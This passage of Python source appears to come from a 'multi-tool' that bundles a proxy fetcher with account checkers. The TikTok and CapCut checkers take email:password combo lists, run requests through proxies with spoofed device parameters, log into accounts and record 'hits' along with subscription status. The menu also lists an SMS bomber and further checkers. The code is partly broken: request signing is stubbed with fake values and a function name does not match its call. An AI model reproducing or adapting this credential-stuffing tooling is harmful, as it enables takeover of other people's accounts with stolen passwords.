        "BossKupalKaba?"
    ]
    random_name = random.choice(names)
    console.print(f"Generated Username: {random_name}", style="cyan")

def email_generator():
    console.print(Panel("Generating Email and Password...", title="Email & Password Generator", title_align="left", border_style="blue"))
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    
    email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@mail.com"
    password = ''.join(random.choices(chars, k=12))
    
    output_file = "Shampooo_Master_email_pass.txt"
    with open(output_file, 'w') as f:
        f.write(f"Email: {email}\n")
        f.write(f"Password: {password}\n")

    console.print(f"Generated Email: {email}", style="cyan")
    console.print(f"Generated Password: {password}", style="cyan")
    console.print(f"Email and Password saved to: {output_file}", style="green")

def home_page():
    display_banner()  # Display the banner at the start
    while True:
        table = Table(title="Welcome to Shampooo Master", border_style="green")
        table.add_column("Option", style="bold green")
        table.add_column("Description", style="bold green")

        table.add_row(" 1", "Search for Text in a File")
        table.add_row("2", "Generate a Random Username")
        table.add_row("3", "Create an Email and Password")
        table.add_row("4", "Exit")

        console.print(table)

        choice = input("Select an option: ")
        if choice == "1":
            txt_finder()
        elif choice == "2":
            name_maker()
        elif choice == "3":
            email_generator()
        elif choice == "4":
            console.print("Exiting the tool. Goodbye!", style="bold red")
            break
        else:
            console.print("Invalid option. Please try again.", style="red")
                
# =============== CREDITS =============== #
CREDITS = "Created by: FUFU - SHAMPOKE"
print("=" * 50)
print(f"{CREDITS.center(50)}")
print("=" * 50)

# =============== BANNER (Using PyFiglet) =============== #
banner = pyfiglet.figlet_format("PROXY FETCHER", font="bloody")
print(banner)

# Proxy sources (Free and Paid)
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",  # Free HTTP Proxies
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",  # Free SOCKS4 Proxies
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",  # Free SOCKS5 Proxies
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all",  # Free HTTP Proxies
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=5000&country=all",  # Free SOCKS4 Proxies
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&country=all",  # Free SOCKS5 Proxies
    "https://www.proxy-list.download/api/v1/get?type=https",  # Free HTTPS Proxies
    "https://www.proxy-list.download/api/v1/get?type=socks4",  # Free SOCKS4 Proxies
    "https://www.proxy-list.download/api/v1/get?type=socks5",  # Free SOCKS5 Proxies
    "https://www.proxynova.com/proxy-server-list/country-us/",  # Free US Proxy List
    "https://premium.proxyliststore.com/api/v1/getproxies?api_key=YOUR_API_KEY",  # Paid Proxy API (replace with your API key)
    "https://www.proxylisty.com/api/get_proxies?type=http&key=YOUR_API_KEY",  # Paid Proxy API (replace with your API key)
    "https://www.oxyproxy.com/api/proxies?api_key=YOUR_API_KEY",  # Paid Proxy API (replace with your API key)
]

# Global proxy list
proxies = []

# =============== PROXY FETCHER =============== #
def fetch_proxies():
    """Fetch proxies from multiple sources."""
    global proxies
    print("\nFetching proxies...")

    def fetch_from_source(url):
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                fetched = response.text.strip().split("\n")
                proxies.extend(fetched)
                print(f"✔ Fetched {len(fetched)} proxies from {url}")
        except requests.RequestException:
            print(f"✘ Failed to fetch from {url}")

    threads = [threading.Thread(target=fetch_from_source, args=(url,)) for url in PROXY_SOURCES]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

# =============== PROXY CHECKER (FREE vs PREMIUM) =============== #
def check_proxy(proxy, proxy_type):
    """Checks if a proxy is working & detects if it's premium or free."""
    try:
        test_url = "http://httpbin.org/ip"
        start_time = time.time()
        
        if proxy_type in ["http", "https"]:
            response = requests.get(test_url, proxies={proxy_type: f"{proxy_type}://{proxy}"}, timeout=5)
        else:
            host, port = proxy.split(":")[:2]
            socks.setdefaultproxy(getattr(socks, f"PROXY_{proxy_type.upper()}"), host, int(port))
            socket.socket = socks.socksocket
            response = requests.get(test_url, timeout=5)

        response_time = time.time() - start_time  # Calculate speed

        if response.status_code == 200:
            anonymity = detect_anonymity(proxy, proxy_type)
            is_premium = detect_premium(proxy, anonymity, response_time)

            if is_premium:
                with open("premium_proxies.txt", "a") as f:
                    f.write(f"{proxy_type}://{proxy}\n")
                print(f"✔ PREMIUM [{proxy_type.upper()}] - {proxy} (Speed: {round(response_time, 2)}s)")
            else:
                with open("free_proxies.txt", "a") as f:
                    f.write(f"{proxy_type}://{proxy}\n")
                print(f"✔ FREE [{proxy_type.upper()}] - {proxy} (Speed: {round(response_time, 2)}s)")
        else:
            raise Exception("Invalid response")

    except:
        with open("failed_proxies.txt", "a") as f:
            f.write(f"{proxy_type}://{proxy}\n")
        print(f"✘ FAILED [{proxy_type.upper()}] - {proxy}")

def detect_anonymity(proxy, proxy_type):
    """Checks if the proxy is Transparent, Anonymous, or Elite."""
    try:
        response = requests.get("http://httpbin.org/ip", proxies={proxy_type: f"{proxy_type}://{proxy}"}, timeout=5)
        real_ip = requests.get("http://api.ipify.org").text  
        
        if real_ip in response.text:
            return "Transparent"  
        elif "X-Forwarded-For" in response.headers:
            return "Anonymous"  
        else:
            return "Elite"  
    except:
        return "Unknown"


def detect_premium(proxy, anonymity, speed):
    """Determines if a proxy is premium based on anonymity & speed."""
    if anonymity == "Elite" and speed < 2.0:
        return True  # Premium proxies are Elite & Fast
    return False


def validate_proxies():
    """Validates all fetched proxies using multi-threading."""
    print("\nValidating proxies...")
    
    threads = []
    for proxy in proxies:
        proxy_type = "http" if ":" in proxy else "socks5"  # Default to SOCKS5 if unknown
        t = threading.Thread(target=check_proxy, args=(proxy, proxy_type))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()


def proxymenu():
    """Display the menu and handle user input."""
    while True:
        os.system("clear")  
        print(banner)
        print("Proxy Fetcher & Validator Tool")
        print("=" * 50)
        print("1. Fetch Proxies")
        print("2. Validate Proxies")
        print("3. View Working Proxies (Premium / Free)")
        print("4. View Failed Proxies")
        print("5. Exit")
        print("=" * 50)
        
        choice = input("Enter your choice (1-5): ").strip()
        
        if choice == "1":
            fetch_proxies()
        elif choice == "2":
            validate_proxies()
        elif choice == "3":
            view_proxies("premium_proxies.txt", "Working Premium Proxies")
        elif choice == "4":
            view_proxies("failed_proxies.txt", "Failed Proxies")
        elif choice == "5":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")
        input("\nPress Enter to continue...")

def view_proxies(filename, title):
    """View the proxies from a specified file."""
    if os.path.exists(filename):
        print(f"\n{title}:")
        with open(filename, "r") as f:
            proxies_list = f.readlines()
            if proxies_list:
                for proxy in proxies_list:
                    print(proxy.strip())
            else:
                print(f"No proxies found in {filename}.")
    else:
        print(f"{filename} does not exist.")
        
# from MedoSigner import Argus, Gorgon, md5, Ladon

def md5(x): 
    import hashlib
    return hashlib.md5(x.encode()).hexdigest()

class Argus:
    @staticmethod
    def get_sign(*args, **kwargs): return "FAKE_ARGUS_SIGNATURE"

class Gorgon:
    def __init__(self, *args, **kwargs): pass
    def get_value(self): 
        return {"x-gorgon": "FAKE_GORGON", "x-khronos": int(time.time())}

class Ladon:
    @staticmethod
    def encrypt(*args, **kwargs): return "FAKE_LADON_SIGNATURE"
        
HITS = 0
BAD = 0
RETRIES = 0
MAX_ATTEMPTS = 10000000
LOCK = threading.Lock()
FILE_LOCK = threading.Lock()

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str = None,
         aid: int = 567753, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n",
         sdk_version: int = 2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload is not None else None
    if not unix:
        unix = int(time.time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(params, x_ss_stub, unix,
                                  platform=platform, aid=aid, license_id=license_id,
                                  sec_device_id=sec_device_id, sdk_version=sdk_version_str,
                                  sdk_version_int=sdk_version)
    }

def PROXY_HANDLER(proxy_line):
    proxy_line = proxy_line.strip()
    if not proxy_line:
        return None
    if "@" in proxy_line:
        parts = proxy_line.split("@")
        if all(ch.isdigit() or ch in ".:" for ch in parts[0]):
            ip_port = parts[0]
            credentials = parts[1]
        else:
            credentials = parts[0]
            ip_port = parts[1]
        proxy_url = f"http://{credentials}@{ip_port}"
    else:
        proxy_url = f"http://{proxy_line}"
    return proxy_url

def update_progress():
    with LOCK:
        progress_message = (
            f"\r\033[1;36m[+] TikTok Account Checker\033[0m\n"
            f"\033[1;32m[✓] Hits: {HITS}\033[0m | "
            f"\033[1;31m[X] Bad: {BAD}\033[0m | "
            f"\033[1;33m[~] Retries: {RETRIES}\033[0m"
        )
        sys.stdout.write(progress_message)
        sys.stdout.flush()

def capture(email, password, username):
    global HITS
    try:
        ua = UserAgent()
        headers = {'user-agent': ua.random}
        response = requests.get(f'https://www.tiktok.com/@{username}', headers=headers).text
        
        if '"userInfo":{"user":{' not in response:
            return
        
        data = response.split('"userInfo":{"user":{')[1].split('</sc')[0]
        user_id = re.search(r'"id":"(.*?)"', data).group(1)
        nickname = re.search(r'"nickname":"(.*?)"', data).group(1)
        following = re.search(r'"followingCount":(\d+)', data).group(1)
        followers = re.search(r'"followerCount":(\d+)', data).group(1)
        likes = re.search(r'"heart":(\d+)', data).group(1)  
        videos = re.search(r'"videoCount":(\d+)', data)  
        videos = videos.group(1) if videos else "N/A"
        friends_count = re.search(r'"friendCount":(\d+)', data)  
        friends_count = friends_count.group(1) if friends_count else "N/A"
        is_private = re.search(r'"privateAccount":(true|false)', data)  
        is_private = "Yes" if is_private and is_private.group(1) == "true" else "No"
        is_verified = re.search(r'"verified":(true|false)', data)  
        is_verified = "Yes" if is_verified and is_verified.group(1) == "true" else "No"
        is_seller = re.search(r'"commerceInfo":{"seller":(true|false)', data)  
        is_seller = "Yes" if is_seller and is_seller.group(1) == "true" else "No"
        language = re.search(r'"language":"(.*?)"', data)  
        language = language.group(1) if language else "N/A"
        date_create = datetime.datetime.fromtimestamp(int(re.search(r'"createTime":(\d+)', data).group(1))).strftime("%Y-%m-%d")
        region = re.search(r'"region":"(.*?)"', data).group(1)
        profile_pic_url = re.search(r'"avatarLarger":"(.*?)"', data).group(1)

        result = (f"{email}:{password} | Username = {username} | Followers = {followers} | "
                  f"Following = {following} | Friends = {friends_count} | Likes = {likes} | "
                  f"Videos = {videos} | Private = {is_private} | Verified = {is_verified} | "
                  f"TikTok Seller = {is_seller} | Language = {language} | "
                  f"Country = {region} | Created at = {date_create} | Profile Pic = {profile_pic_url}\n") 

        with FILE_LOCK:
            with open("TikTok-Hits.txt", "a") as f:
                f.write(result)
        with LOCK:
            HITS += 1
    except:
        pass

def check__account(combo, proxies=None):
    global BAD, RETRIES
    try:
        email, password = combo.strip().split(":", 1)
    except ValueError:
        return

    attempt = 0
    while attempt < MAX_ATTEMPTS:
        attempt += 1
        
        
        proxies_dict = None
        if proxies:
            proxy = random.choice(proxies)
            proxy_url = PROXY_HANDLER(proxy)
            proxies_dict = {"http": proxy_url, "https": proxy_url}
        
        try:
            secret = secrets.token_hex(16)
            tim = str(round(random.uniform(1.2, 1.6) * 100000000) * -1)
            timr = str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632"
            cc = str(uuid.uuid4())
            op = str(binascii.hexlify(os.urandom(8)).decode())
            iid = str(random.randint(1, 10**19))
            dev = str(random.randint(1, 10**19))
            
            data_dict = {
                'account_sdk_source': 'app',
                'multi_login': '1',
                'email': email,
                'mix_mode': '1'
            }
            cookies = {
                'passport_csrf_token': secret,
                'passport_csrf_token_default': secret,
            }
            
            params_str = (
                'passport-sdk-version=19&iid=' + iid +
                '&device_id=' + dev +
                '&ac=mobile&channel=googleplay&aid=567753&app_name=tiktok_studio'
                '&version_code=320905&version_name=32.9.5&device_platform=android&os=android'
                '&ab_version=32.9.5&ssmix=a&device_type=Redmi%20Note%208%20Pro&device_brand=Redmi'
                '&language=ar&os_api=30&os_version=11&openudid=' + op +
                '&manifest_version_code=320905&resolution=1080*2220&dpi=440&update_version_code=320905'
                '&_rticket=' + timr +
                '&is_pad=0&app_type=normal&sys_region=EG&mcc_mnc=42103&timezone_name=Asia/Aden'
                '&app_language=ar&carrier_region=YE&ac2=lte&uoo=1&op_region=YE&timezone_offset=10800'
                '&build_number=32.9.5&host_abi=arm64-v8a&locale=ar&region=EG&ts=' + tim +
                '&cdid=' + cc +
                '&support_webview=1&cronet_version=5828ea06_2024-03-28'
                '&ttnet_version=4.2.137.58-tiktok&use_store_region_cookie=1'
            )
            payload_encoded = urlencode(data_dict)
            m = sign(params=params_str, payload=payload_encoded, cookie=urlencode(cookies))
            
            headers = {
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'User-Agent': ('com.ss.android.tt.creator/320905 (Linux; U; Android 11; ar_EG; '
                               'Redmi Note 8 Pro; Build/RP1A.200720.011; Cronet/TTNetVersion:5828ea06 '
                               '2024-03-28 QuicVersion:68c84b0f 2024-02-29)'),
                'x-argus': m["x-argus"],
                'x-gorgon': m["x-gorgon"],
                'x-khronos': m["x-khronos"],
                'x-ladon': m["x-ladon"],
            }
            
            url = (
                'https://api16-normal-no1a.tiktokv.eu/passport/user/check_email_registered?'
                'passport-sdk-version=19&iid=' + iid +
                '&device_id=' + dev +
                '&ac=mobile&channel=googleplay&aid=567753&app_name=tiktok_studio'
                '&version_code=320905&version_name=32.9.5&device_platform=android&os=android'
                '&ab_version=32.9.5&ssmix=a&device_type=Redmi%20Note%208%20Pro&device_brand=Redmi'
                '&language=ar&os_api=30&os_version=11&openudid=' + op +
                '&manifest_version_code=320905&resolution=1080*2220&dpi=440&update_version_code=320905'
                '&_rticket=' + timr +
                '&is_pad=0&app_type=normal&sys_region=EG&mcc_mnc=42103&timezone_name=Asia/Aden'
                '&app_language=ar&carrier_region=YE&ac2=lte&uoo=1&op_region=YE&timezone_offset=10800'
                '&build_number=32.9.5&host_abi=arm64-v8a&locale=ar&region=EG&ts=' + tim +
                '&cdid=' + cc +
                '&support_webview=1&cronet_version=5828ea06_2024-03-28'
                '&ttnet_version=4.2.137.58-tiktok&use_store_region_cookie=1'
            )
            
            response = requests.post(url, cookies=cookies, headers=headers,
                                     data=data_dict, proxies=proxies_dict, timeout=10)
            
            if "1" in response.text:
                username = email.split('@')[0]
                capture(email, password, username)
            elif "0" in response.text:
                with LOCK:
                    BAD += 1
            else:
                with LOCK:
                    BAD += 1
            break
        except requests.exceptions.RequestException:
            with LOCK:
                RETRIES += 1
            update_progress()
            continue
    update_progress()

def tiktokmain():
    print("\033[1;34m" + "="*60)
    print("      TikTok Account Checker")
    print("="*60 + "\033[0m")

    combo_file = input("\033[1;35m[>] Enter Combo File: \033[0m").strip()
    use_proxies = input("\033[1;35m[>] Use Proxies? (y/n): \033[0m").strip().lower() == 'y'
    
    proxies = None
    if use_proxies:
        proxy_file = input("\033[1;35m[>] Enter Proxies File: \033[0m").strip()
        if not os.path.isfile(proxy_file):
            print("\033[1;31m[!] Proxy file not found, continuing without proxies.\033[0m")
        else:
            with open(proxy_file, "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            if not proxies:
                print("\033[1;31m[!] No proxies found in file, continuing without proxies.\033[0m")
                proxies = None
    
    print("\033[1;34m" + "="*60 + "\033[0m")
    
    if not os.path.isfile(combo_file):
        print("\033[1;31m[!] Combo file not found, try again.\033[0m")
        return
    
    with open(combo_file, "r") as f:
        combos = [line.strip() for line in f if line.strip()]
    
    if not combos:
        print("\033[1;31m[!] Combo file is empty, try again.\033[0m")
        return
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(check_account, combo, proxies) for combo in combos]
        concurrent.futures.wait(futures)

def cupcut_get_random_ua():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
    ]
    return random.choice(user_agents)


def cupcut_create_session():
    session = requests.Session()
    session.headers.update({
        "User-Agent": cupcut_get_random_ua(),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.capcut.com",
        "Referer": "https://www.capcut.com/",
        "DNT": "1",
        "Connection": "keep-alive"
    })
    return session


def cupcut_format_timestamp(timestamp):
    try:
        return datetime.fromtimestamp(int(timestamp)).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return "N/A"

def cupcut_check_email(session, email):
    url = "https://www.capcut.com/passport/web/user/check_email_registered"
    params = {
        "aid": "348188",
        "account_sdk_source": "web",
        "sdk_version": "2.1.2-abroad-beta.0",
        "language": "en",
        "verifyFp": "verify_lrheiigf_Hq50vVEG_V93Z_4w5g_AZmq_S0C7dJ1L3BPW"
    }
    data = {"mix_mode": "1", "email": email, "fixed_mix_mode": "1"}
    try:
        response = session.post(url, params=params, data=data, timeout=15)
    except requests.RequestException as e:
        print(f"[!] Network error checking {email}: {e}")
        return None, None
    return response.cookies.get("passport_csrf_token"), response.cookies.get("x_logid")


def cupcut_login(session, email, password, csrf_token):
    url = "https://www.capcut.com/passport/web/email/login/"
    params = {
        "aid": "348188",
        "account_sdk_source": "web",
        "sdk_version": "2.1.2-abroad-beta.0",
        "language": "en",
        "verifyFp": "verify_lrheiigf_Hq50vVEG_V93Z_4w5g_AZmq_S0C7dJ1L3BPW"
    }
    data = {"mix_mode": "1", "email": email, "password": password, "fixed_mix_mode": "1"}
    headers = {"x-tt-passport-csrf-token": csrf_token} if csrf_token else {}
    session.headers.update(headers)
    try:
        response = session.post(url, params=params, data=data, timeout=15)
        return response.json()
    except Exception as e:
        return {"error": str(e)}


def cupcut_get_workspaces(session):
    url = "https://edit-api-sg.capcut.com/cc/v1/workspace/get_user_workspaces"
    data = {"cursor": "0", "count": 100, "need_convert_workspace": True}
    try:
        response = session.post(url, json=data, timeout=15)
        return response.json()
    except:
        return {}


def cupcut_get_subscription_info(session, app_id):
    url = "https://commerce-api-sg.capcut.com/commerce/v1/subscription/user_info"
    data = {"aid": app_id, "scene": "vip"}
    try:
        response = session.post(url, json=data, timeout=15)
        return response.json()
    except:
        return {}


def cupcut_parse_workspace(workspace_data):
    if "data" in workspace_data and "workspace_infos" in workspace_data["data"]:
        ws = workspace_data["data"]["workspace_infos"][0]
        return {
            "region": ws.get("region", ""),
            "member_limit": ws.get("member_limit", 0),
            "member_count": ws.get("member_cnt", 0),
            "quota": ws.get("quota", 0),
            "usage": ws.get("usage", 0),
            "team_vip_status": ws.get("team_vip_status", 0)
        }
    return {}


def cupcut_parse_subscription(sub_data):
    if "data" in sub_data:
        d = sub_data["data"]
        return {
            "is_vip": d.get("flag", False),
            "start_time": d.get("start_time", 0),
            "end_time": d.get("end_time", 0),
            "vip_level": d.get("cur_vip_level", ""),
            "product_id": d.get("product_id", "")
        }
    return {}

def cupcut_handle_account(email, password, out_hits, out_fails):
    session = cupcut_create_session()
    csrf_token, _ = cupcut_check_email(session, email)
    if csrf_token is None:
        print(f"[!] Skipping {email} (network error)")
        with open(out_fails, "a") as f:
            f.write(f"{email}:{password} | check_email_failed\n")
        return False

    login_resp = cupcut_login(session, email, password, csrf_token)
    if isinstance(login_resp, dict) and login_resp.get("data"):
        user_data = login_resp["data"]
        app_id = str(user_data.get("app_id", "348188"))

        workspace_info = cupcut_get_workspaces(session)
        sub_info = cupcut_get_subscription_info(session, app_id)
        workspace = cupcut_parse_workspace(workspace_info)
        sub = cupcut_parse_subscription(sub_info)

        vip_status = "VIP" if sub.get("is_vip") else "FREE"
        result_line = (
            f"{email}:{password} | {vip_status} | VIP-Level: {sub.get('vip_level')} "
            f"| Start: {cupcut_format_timestamp(sub.get('start_time'))} "
            f"| End: {cupcut_format_timestamp(sub.get('end_time'))} | Region: {workspace.get('region')}\n"
        )

        print(f"[HIT] {result_line.strip()}")
        with open(out_hits, "a") as f:
            f.write(result_line)
        return True
    else:
        print(f"[BAD] {email}")
        with open(out_fails, "a") as f:
            f.write(f"{email}:{password} | login_failed\n")
        return False


def cupcut_checker():
    print("\n🟦 CapCut Account Checker (Batch Mode)\n")
    combo_file = input("Enter combo filename (email:pass or email only): ").strip()
    default_password = input("Enter default password (for lines without :pass): ").strip()

    if not os.path.exists(combo_file):
        print(f"[!] File not found: {combo_file}")
        return

    out_hits = "cupcut_hits.txt"
    out_fails = "cupcut_failed.txt"
    open(out_hits, "w").close()
    open(out_fails, "w").close()

    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = [line.strip() for line in f if line.strip()]

    total = len(lines)
    hits, fails = 0, 0

    print(f"[i] Loaded {total} accounts...\n")

    for idx, line in enumerate(lines, 1):
        if ":" in line:
            email, password = line.split(":", 1)
        else:
            email = line
            password = default_password

        if not password:
            print(f"[!] Skipping {email} (no password)")
            with open(out_fails, "a") as f:
                f.write(f"{email} | no_password\n")
            continue

        print(f"[{idx}/{total}] Checking {email}...")
        try:
            ok = cupcut_handle_account(email, password, out_hits, out_fails)
            if ok:
                hits += 1
            else:
                fails += 1
        except Exception as e:
            print(f"[!] Error on {email}: {e}")
            with open(out_fails, "a") as f:
                f.write(f"{email}:{password} | exception: {e}\n")
            fails += 1

        time.sleep(random.uniform(0.8, 1.6))

    print("\n✅ Done!")
    print(f"Total: {total} | Hits: {hits} | Fails: {fails}")
    print(f"Saved hits to: {out_hits}")
    print(f"Saved fails to: {out_fails}")
            
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

import os
import time
import shutil
from cfonts import render


def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def center_text(text):
    """Center text according to terminal width."""
    width = shutil.get_terminal_size().columns
    return text.center(width)

def loading_animation(duration=3):
    """Displays a pulsing 'Loading...' animation with growing/shrinking dots."""
    start_time = time.time()
    dots = ["   ", ".  ", ".. ", "...", ".. ", ".  "]  # pulsing sequence
    i = 0
    while time.time() - start_time < duration:
        print(f"\rLoading{dots[i % len(dots)]}", end="")
        time.sleep(0.3)
        i += 1
    print("\rLoading... Done!      ")

def show_loading_banner():
    """Show the main banner with loading animation."""
    clear_screen()
    banner = render(
        "CCK CLAN MultiTools",
        colors=["magenta", "cyan"],
        align="center",
        font="block"
    )
    print(banner)
    print("\n")
    loading_animation(4)  
    
def show_credits():
    credits = [
        "Antrax",
        "Champo",
        "Xythin",
        "Toshi",
        "Kinzo",
        "ASH",
        "Kairi",
        "Feopp",
        "Ocho",
        "Ziaa",
        "Archangel",
        "Chayyy",
        "hiro_xyz",
        "Seianwei",
        "elohim",
        "xc0z3",
        "Belle",
        "Tyra",
        "Yami",
        "Eren"

    ]

    for name in credits:
        clear_screen()
        big_name = render(
            name,
            colors=["cyan"],
            align="center",
            font="block"
        )
        print(big_name)
        time.sleep(0.8)  

    clear_screen()

def show_banner():
    output = render(
        '{CCK CLAN}',
        gradient=['#A020F0', '#40E0D0'],  
        align='center',
        font='block',
        space=True
    )
    print(output)

    subtitle = center_text('\033[93mCCK MULTI-TOOL\033[0m') 
    
    print('\n' + subtitle + '\n')


from rich.console import Console
from rich.panel import Panel

console = Console()

if __name__ == "__main__":
    show_loading_banner()
    show_credits()
    show_banner()
    
    # MAIN LOOP
    while True:
        console.print(
            Panel(
                "[1] CODM Checker       [3] Crunchyroll       [5] CODM SEP\n"
                "[2] Codashop           [4] SMS Bomb          [6] Logs to TXT\n"
                "[7] PH Checker         [8] Roblox Lookup     [9] Netease Checker\n"
                "[10] Python Obfuscator [11] ML Selector       [12] Keyword Searcher\n"
                "[13] Proxy Fetcher     [14] TikTok Checker    [15] CupCut Checker\n"
                "[16] Exit",
                title="Main Menu ───────────────────────────── [@findmebro20]",
                style="bold cyan",
            )
        )

        try:
            choice = console.input("\nEnter Number: ").strip()

            if choice == "1":
                console.print(Panel("Starting CODM Checker...", style="green"))
                try:
                    if "main_validation" in globals() and callable(globals()["main_validation"]):
                        device_id = globals()["main_validation"]()
                        console.print(
                            Panel(
                                f"[cyan]Device validated successfully![/cyan]\n[b]Device ID:[/b] {device_id}",
                                style="green",
                            )
                        )
                    if "main" in globals() and callable(globals()["main"]):
                        globals()["main"]()
                except Exception as e:
                    console.print(Panel(f"[ERROR] CODM Checker crashed:\n{e}", style="red"))
                input("\nPress Enter to return to menu...")

            elif choice == "2":
                console.print(Panel("Starting Codashop Checker...", style="green"))
                try:
                    if "CodashopChecker" in globals() and callable(globals()["CodashopChecker"]):
                        app = globals()["CodashopChecker"]()
                        if hasattr(app, "menu") and callable(getattr(app, "menu")):
                            app.menu()
                except Exception as e:
                    console.print(Panel(f"[ERROR] Codashop Checker crashed:\n{e}", style="red"))
                input("\nPress Enter to return to menu...")

            elif choice == "4":
                console.print(Panel("Starting SMS Bomb...", style="green"))
                try:
                    if "sms_bomb" in globals() and callable(globals()["sms_bomb"]):
                        globals()["sms_bomb"]()
                except Exception as e:
                    console.print(Panel(f"[ERROR] SMS Bomb crashed:\n{e}", style="red"))
                input("\nPress Enter to return to menu...")

            elif choice == "5":
                console.print(Panel("Starting CODM SEP...", style="green"))
                try:
                    if "codm_sep" in globals() and callable(globals()["codm_sep"]):
                        globals()["codm_sep"]()
                except Exception as e:
                    console.print(Panel(f"[ERROR] CODM SEP crashed:\n{e}", style="red"))
                input("\nPress Enter to return to menu...")

            elif choice == "6":
                console.print(Panel("Starting Logs to TXT tool...", style="green"))
                try:
                    run_logs_to_txt()
                except Exception as e:
                    console.print(Panel(f"[ERROR] Logs to TXT crashed:\n{e}", style="red"))
                input("\nPress Enter to return to menu...")

            elif choice == "7":
                console.print(Panel("Starting PH Checker...", style="green"))
                try:
                    if "PornHubChecker" in globals() and callable(globals()["PornHubChecker"]):
                        if "ph_main" in globals() and callable(globals()["ph_main"]):
                            globals()["ph_main"]()
                except Exception as e:
                    console.print(Panel(f"[ERROR] PH Checker crashed:\n{e}", style="red"))
                input("\nPress Enter to return to menu...")

            elif choice == "8":
                console.print(Panel("Starting Roblox Lookup...", style="green"))
                try:
                    if "RobloxChecker" in globals() and callable(globals()["RobloxChecker"]):
                        checker = globals()["RobloxChecker"]()
                        if hasattr(checker, "run") and callable(getattr(checker, "run")):
                            checker.run()
                        else:
                            console.print(
                                Panel(
                                    "[red]Error:[/red] 'run()' method not found in RobloxChecker class.",
                                    style="red"
                                )
                            )
                    else:
                        console.print(
                            Panel(
                                "[red]Error:[/red] RobloxChecker class not found or not callable.",
                                style="red"
                            )
                        )
                except Exception as e:
                    console.print(
                        Panel(
                            f"[ERROR] Roblox Lookup crashed:\n{e}",
                            style="red"
                        )
                    )
                input("\nPress Enter to return to menu...")

            elif choice == "9":
                console.print(Panel("Starting Netease Checker...", style="green"))
                try:
                    if "NeteaseGamesChecker" in globals():
                        checker = NeteaseGamesChecker()
                        checker.start()
                except Exception as e:
                    console.print(Panel(f"[ERROR] Netease Checker crashed:\n{e}", style="red"))
                input("\nPress Enter to return to menu...")

            elif choice == "10":
                console.print(Panel("Launching Python Obfuscator...", style="green"))
                try:
                    run_obfuscator()
                except Exception as e:
                    console.print(Panel(f"[ERROR] Obfuscator crashed:\n{e}", style="red"))
                input("\nPress Enter to return to menu...")

            elif choice == "11":
                console.print(Panel("Launching ML Selector...", style="green"))
                try:
                    import ml_selector_script  
                    ml_selector_script.main()
                except Exception as e:
                    console.print(Panel(f"[ERROR] ML Selector crashed:\n{e}", style="red"))
                input("\nPress Enter to return to menu...")

            elif choice == "12":
                console.print(Panel("Launching Keyword Searcher...", style="green"))
                try:
                    if "txt_finder" in globals() and callable(globals()["txt_finder"]):
                        globals()["txt_finder"]()
                    else:
                        import keyword_searcher
                        keyword_searcher.txt_finder()
                except Exception as e:
                    console.print(Panel(f"[ERROR] Keyword Searcher crashed:\n{e}", style="red"))
                input("\nPress Enter to return to menu...")

            elif choice == "13":
                console.print(Panel("Launching Proxy Fetcher...", style="green"))
                try:
                    if "proxymenu" in globals() and callable(globals()["proxymenu"]):
                        globals()["proxymenu"]()
                    else:
                        import proxy_fetcher
                        proxy_fetcher.proxymenu()
                except Exception as e:
                    console.print(Panel(f"[ERROR] Proxy Fetcher crashed:\n{e}", style="red"))
                input("\nPress Enter to return to menu...")

            elif choice == "14":
                console.print(Panel("Launching TikTok Checker...", style="green"))
                try:
                    if "tiktokmain" in globals() and callable(globals()["tiktokmain"]):
                        globals()["tiktokmain"]()
                    else:
                        import tiktok_checker
                        tiktok_checker.tiktokmain()
                except Exception as e:
                    console.print(Panel(f"[ERROR] TikTok Checker crashed:\n{e}", style="red"))
                input("\nPress Enter to return to menu...")

            elif choice == "15":
                console.print(Panel("Launching CupCut Checker...", style="green"))
                try:
                    if "cupcut_checker" in globals() and callable(globals()["cupcut_checker"]):
                        globals()["cupcut_checker"]()
                    else:
                        import cupcut_checker
                        cupcut_checker.cupcut_checker()
                except Exception as e:
                    console.print(Panel(f"[ERROR] CupCut Checker crashed:\n{e}", style="red"))
